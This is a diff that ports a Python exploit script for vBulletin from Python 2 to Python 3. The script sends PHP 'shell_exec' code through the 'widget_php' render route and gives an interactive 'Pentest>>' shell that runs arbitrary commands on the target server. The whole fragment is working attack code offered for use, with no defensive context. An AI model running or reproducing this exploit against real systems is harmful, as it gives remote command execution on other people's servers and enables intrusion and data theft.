@@ -15,14 +15,14 @@ params ={"routestring":"ajax/render/widget_php"}
 
 while True:
      try:
-         cmd = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/vbulletin (vBulletin$)"+N+"): ")
+         cmd = input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/vbulletin (vBulletin$)"+N+"): ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
          r = requests.post(url = sys.argv[1], data = params)
          if r.status_code == 200:
-              print r.text
+              print(r.text)
          else:
              sys.exit("Exploit failed!")
      except KeyboardInterrupt:
          sys.exit("\n Exitt...")
-     except Exception, e:
+     except Exception as e:
          sys.exit(str(e))
